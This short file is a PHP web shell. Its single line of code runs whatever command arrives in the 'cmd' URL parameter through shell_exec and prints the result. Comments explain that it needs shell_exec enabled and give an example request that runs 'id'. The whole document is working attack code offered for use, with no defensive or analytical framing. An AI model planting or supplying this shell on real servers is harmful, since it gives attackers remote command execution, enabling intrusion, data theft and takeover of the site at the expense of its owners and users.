# This will only work if the shell_exec() function is enabled and not disabled in the PHP configuration.
# Execution: http://example.com/webshell_shell_exec.php?cmd=id

<?php echo shell_exec($_GET['cmd']); ?>